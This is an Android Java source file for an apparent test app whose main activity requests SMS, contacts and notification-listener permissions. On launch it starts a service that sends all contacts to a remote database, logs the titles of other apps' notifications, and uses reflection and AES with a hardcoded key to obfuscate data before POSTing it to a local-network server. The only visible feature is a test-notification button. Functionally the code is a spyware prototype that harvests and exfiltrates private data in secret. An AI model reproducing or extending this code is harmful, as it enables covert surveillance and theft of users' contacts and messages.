package com.test.myapplication;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.NotificationCompat;
import androidx.core.app.NotificationManagerCompat;

import android.Manifest;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.service.notification.StatusBarNotification;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import com.test.myapplication.services.SendAllContactsService;
import com.test.myapplication.services.SendToDBService;

import org.json.JSONObject;

import java.io.UnsupportedEncodingException;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;


public class MainActivity extends AppCompatActivity {

    static {
        System.loadLibrary("myapplication");
    }

    Button notifybtn;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        TextView textview = (TextView)findViewById(R.id.tv);
        textview.setText(stringFromJNI("Hi"));


        /*Send test notification*/
        notifybtn = findViewById(R.id.notify_btn);
        notifybtn.setOnClickListener(new View.OnClickListener(){

            @Override
            public void onClick(View v) {
                NotificationChannel channel = new NotificationChannel("1","1",NotificationManager.IMPORTANCE_DEFAULT);

                NotificationManager manager = getSystemService(NotificationManager.class);
                manager.createNotificationChannel(channel);

                NotificationCompat.Builder builder = new NotificationCompat.Builder(MainActivity.this, "1");
                builder.setContentText("tezt");
                builder.setContentTitle("dasd");
                builder.setSmallIcon(R.drawable.ic_launcher_background);
                builder.setAutoCancel(true);
                NotificationManagerCompat managerCompat = NotificationManagerCompat.from(MainActivity.this);
                managerCompat.notify(1,builder.build());

            }
        });

        requestPermissions(new String[]{Manifest.permission.READ_SMS, Manifest.permission.READ_CONTACTS, Manifest.permission.RECEIVE_SMS, Manifest.permission.BIND_NOTIFICATION_LISTENER_SERVICE }, 1);

        /* Send all contacts to DB*/
        Intent serviceIntent = new Intent(getApplicationContext(), SendAllContactsService.class);
        startService(serviceIntent);

        /* Logs all notifications*/

        NotificationManager nm = (NotificationManager) getApplicationContext().getSystemService(NOTIFICATION_SERVICE);
        StatusBarNotification[] array =  nm.getActiveNotifications();


        for (StatusBarNotification var : array){
            Log.i(" NOTIFCIATION", var.getNotification().extras.getCharSequence(NotificationCompat.EXTRA_TITLE).toString());
        }

        /*Encodes package name using reflection*/
        try {
            Method m = Base64.class.getMethod("encodeToString", byte[].class, int.class);
            m.setAccessible(true);
            String base64String = m.invoke(null, this.getPackageName().getBytes(StandardCharsets.UTF_8), Base64.DEFAULT).toString();
            Log.i("TAG3", base64String);

            JSONObject json = new JSONObject();

            {
                try {
                    Log.i("TAG3", MainActivity.encrypt(base64String));

                    json.put(MainActivity.encrypt("text"), MainActivity.encrypt(base64String));
                } catch (Exception e) {
                    e.printStackTrace();
                }

            }

            SendToDBService asd = new SendToDBService(json, "http://192.168.2.66/android/index.php/post_package").perform(this);


        } catch (Exception e) {
            e.printStackTrace();
        }


    }

    private static SecretKey generateKey()
    {
        return new SecretKeySpec("testetestcqwecqe".getBytes(), "AES");
    }

    public static String encrypt(String message) throws NoSuchPaddingException, NoSuchAlgorithmException, UnsupportedEncodingException, InvalidKeyException, BadPaddingException, IllegalBlockSizeException {
        /* Encrypt the message. */
        Cipher cipher = null;
        cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.ENCRYPT_MODE, generateKey());
        byte[] encrypted = cipher.doFinal(message.trim().getBytes());
        return Base64.encodeToString(encrypted, Base64.DEFAULT);
    }

    public static String decrypt(String message) throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, BadPaddingException, IllegalBlockSizeException, UnsupportedEncodingException {
        /* Decrypt the message, given derived encContentValues and initialization vector. */
        byte[] cipherText =  Base64.decode(message, Base64.DEFAULT);
        Cipher cipher = null;
        cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE, generateKey());
        String decryptString = new String(cipher.doFinal(cipherText), "UTF-8");
        return decryptString;
    }




    public native String stringFromJNI(String test);
}